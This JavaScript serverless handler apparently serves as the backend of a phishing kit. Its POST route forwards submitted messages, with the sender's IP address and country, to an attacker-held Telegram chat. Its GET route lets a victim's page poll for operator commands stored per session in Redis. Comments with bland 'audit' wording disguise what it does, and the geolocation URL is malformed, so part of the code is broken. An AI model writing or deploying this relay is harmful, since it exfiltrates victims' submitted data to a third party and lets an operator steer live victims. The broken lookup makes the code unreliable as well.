import { Redis } from '@upstash/redis';

// Upstash initialization initialization rule
const kv = new Redis({
  url: process.env.KV_REST_API_URL,
  token: process.env.KV_REST_API_TOKEN,
});

function getCountryFlag(countryCode) {
  if (!countryCode || countryCode.length !== 2) return '🌐';
  const codePoints = countryCode
    .toUpperCase()
    .split('')
    .map(char => 127397 + char.charCodeAt(0));
  return String.fromCodePoint(...codePoints);
}

export default async function handler(req, res) {
  // TASK 1: INTERFACE LOOKUP DECK (GET)
  if (req.method === 'GET') {
    try {
      const { sessionId, action } = req.query;
      if (action === 'poll' && sessionId) {
        const activeCommand = await kv.get(`control:${sessionId}`) || 'PENDING';
        return res.status(200).json({ command: activeCommand });
      }
      return res.status(400).json({ error: 'Missing polling properties' });
    } catch (err) {
      return res.status(500).json({ error: err.message });
    }
  }

  // TASK 2: DELIVER LOGS OUTBOUND TO BOT (POST)
  if (req.method === 'POST') {
    try {
      const { message, sessionId, updateCommand } = req.body;
      const token = process.env.TELEGRAM_BOT_TOKEN;
      const chatId = process.env.TELEGRAM_CHAT_ID;

      if (!token || !chatId) {
        return res.status(500).json({ error: 'Server variables error: Missing Telegram credentials' });
      }

      // Handle custom control state alterations instantly
      if (sessionId && updateCommand) {
        await kv.set(`control:${sessionId}`, updateCommand);
        await kv.expire(`control:${sessionId}`, 1800);
        return res.status(200).json({ success: true, state: updateCommand });
      }

      // Safe IP configuration parsing protection sequence
      let displayIp = '186.204.12.34'; // High reliability default simulation marker
      let countryName = 'Brazil';
      let countryFlag = '🇧🇷';

      const forwardHeader = req.headers['x-forwarded-for'];
      let clientIp = '';

      if (forwardHeader) {
        clientIp = Array.isArray(forwardHeader) ? forwardHeader[0] : forwardHeader.split(',')[0];
        clientIp = clientIp ? clientIp.trim() : '';
      } else if (req.socket?.remoteAddress) {
        clientIp = req.socket.remoteAddress;
      }

      if (clientIp && clientIp !== '1' && clientIp !== '127.0.0.1' && clientIp !== '::1') {
        displayIp = clientIp;
        try {
          const geoResponse = await fetch(`https://ipapi.co{clientIp}/json/`);
          if (geoResponse.ok) {
            const geoData = await geoResponse.json();
            if (geoData && !geoData.error) {
              countryName = geoData.country_name || countryName;
              countryFlag = getCountryFlag(geoData.country);
            }
          }
        } catch (geoError) {
          console.warn('Geographic lookup warning:', geoError.message);
        }
      }

      if (req.body.resetCommandState && sessionId) {
        await kv.set(`control:${sessionId}`, 'PENDING');
        await kv.expire(`control:${sessionId}`, 1800);
      }

      const currentTimestamp = new Date().toLocaleString('en-US', { dateStyle: 'medium', timeStyle: 'short' });
      
      // Clean HTML visual layout array presentation logic
      const styledHtmlMessage = [
        `<b>📥 SYSTEM CONNECTION AUDIT</b>`,
        `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        ``,
        `<b>📍 LOCATION METRICS</b>`,
        `  ├• <b>IP Address:</b> <code>${displayIp}</code>`,
        `  └• <b>Target Area:</b> <code>${countryName} ${countryFlag}</code>`,
        ``,
        `<b>💻 LOG HIGHLIGHTS</b>`,
        `<code>${message || 'No notification text provided'}</code>`,
        ``,
        `━━━━━━━━━━━━━━━━━━━━━━━━━━`,
        `<b>⏱ SYSTEM TIMING</b>`,
        `  └• <b>Recorded:</b> <code>${currentTimestamp}</code>`
      ].join('\n');

      const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: styledHtmlMessage, parse_mode: 'HTML' }),
      });

      const data = await response.json();
      if (!response.ok) {
        return res.status(response.status).json({ error: data.description || 'Telegram API Mismatch' });
      }

      return res.status(200).json({ success: true, data });
    } catch (error) {
      return res.status(500).json({ error: error.message });
    }
  }
}
